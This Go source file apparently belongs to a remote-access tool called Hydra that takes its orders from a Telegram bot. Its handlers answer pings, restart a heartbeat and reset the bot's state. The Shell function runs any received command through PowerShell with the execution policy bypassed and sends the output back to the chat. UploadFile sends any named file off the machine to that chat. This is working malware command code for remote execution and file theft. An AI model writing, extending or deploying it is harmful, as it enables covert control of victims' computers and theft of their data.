package commands

import (
	"fmt"
	"os"
	"os/exec"
	"time"

	"github.com/Raffy27/Hydra/api"
	"github.com/Raffy27/Hydra/util"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

const (
	fmtPing = "Pong!\nRequest took %s"
)

func Ping() {
	back := time.Now()
	cfg := tgbotapi.NewMessage(util.ChatID, "Pong!")
	msg, err := api.Bot.Send(cfg)
	util.Handle(err)
	eCfg := tgbotapi.NewEditMessageText(util.ChatID, msg.MessageID, "")
	eCfg.Text = fmt.Sprintf(fmtPing, time.Since(back))
	_, err = api.Bot.Send(eCfg)
	util.Handle(err)
}

func Reset() {
	api.NewGenesis()
	go api.Heartbeat()
}

func Shell(command string) {
	var out string
	cmd := exec.Command("powershell", "-NoLogo", "-Ep", "Bypass", command)
	b, err := cmd.CombinedOutput()
	if err == nil {
		out = string(b)
	}
	cfg := tgbotapi.NewMessage(util.ChatID, fmt.Sprintf("```\n%s\n```", out))
	cfg.ParseMode = "Markdown"
	api.Bot.Send(cfg)
}

//UploadFile handles /file commands by checking for and uploading a file.
func UploadFile(file string) {
	fi, err := os.Stat(file)
	if os.IsNotExist(err) {
		api.Bot.Send(tgbotapi.NewMessage(util.ChatID, "The specified file does not exist."))
		return
	}
	if fi.IsDir() {
		api.Bot.Send(tgbotapi.NewMessage(util.ChatID, "This command expects a file, not a directory."))
		return
	}
	api.Bot.Send(tgbotapi.NewDocumentUpload(util.ChatID, file))
}
